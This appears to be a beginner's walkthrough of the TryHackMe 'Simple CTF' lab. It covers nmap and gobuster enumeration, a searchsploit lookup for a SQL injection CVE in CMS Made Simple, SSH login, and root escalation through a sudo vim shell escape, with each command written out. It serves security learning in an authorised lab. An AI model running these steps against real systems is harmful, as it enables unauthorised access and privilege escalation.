# EasyCTF - TryHackMe Walkthrough

![TryHackMe](https://img.shields.io/badge/TryHackMe-EasyCTF-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-CTF-blue?style=for-the-badge)

## Room Link

https://tryhackme.com/room/easyctf

---

# Overview

EasyCTF (Simple CTF) is a beginner-friendly Capture The Flag room on TryHackMe designed to teach basic penetration testing techniques including:

- Enumeration
- Web exploitation
- SQL Injection
- Credential harvesting
- SSH access
- Linux privilege escalation

This room is excellent for beginners who want hands-on experience with real-world attack methodology.

---

# Skills Learned

- Nmap scanning
- Service enumeration
- Directory brute forcing
- CMS vulnerability research
- SQL Injection exploitation
- SSH authentication
- Linux privilege escalation
- GTFOBins usage

---

# Tools Used

| Tool | Purpose |
|------|----------|
| Nmap | Port scanning |
| Gobuster | Directory enumeration |
| Searchsploit | Vulnerability lookup |
| Hydra | Password brute forcing |
| SSH | Remote login |
| Vim | Privilege escalation |

---

# Enumeration

## Nmap Scan

```bash
nmap -sC -sV -p- TARGET_IP
```

### Open Ports Found

| Port | Service |
|------|----------|
| 21 | FTP |
| 80 | HTTP |
| 2222 | SSH |

---

# Web Enumeration

Using Gobuster:

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Discovered:

```text
/simple
```

---

# CMS Identification

The `/simple` directory was running:

```text
CMS Made Simple 2.2.8
```

Known Vulnerability:

```text
CVE-2019-9053
```

Type:

```text
SQL Injection
```

---

# Exploitation

Using Searchsploit:

```bash
searchsploit cms made simple 2.2.8
```

Run exploit:

```bash
python exploit.py
```

Credentials were extracted successfully.

---

# SSH Access

SSH service was running on port:

```text
2222
```

Connect using:

```bash
ssh username@TARGET_IP -p 2222
```

---

# User Flag

```bash
cat user.txt
```

---

# Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Vim could be executed as root.

Using GTFOBins:

```bash
sudo vim -c ':!/bin/sh'
```

Root shell obtained.

---

# Root Flag

```bash
cat /root/root.txt
```

---

# Key Takeaways

- Always perform full port scans
- Enumerate hidden directories
- Research software versions for known CVEs
- Check sudo permissions carefully
- GTFOBins is extremely useful for privilege escalation

---

# References

- https://tryhackme.com/room/easyctf
- https://gtfobins.github.io/
- https://www.exploit-db.com/
- https://nmap.org/

---

# Author

**Sampath Mattakoyya**

- SOC Analyst Enthusiast
- Cybersecurity Learner
- TryHackMe Player

---

# Disclaimer

This walkthrough is created for educational purposes only. Practice ethical hacking only in authorized environments.
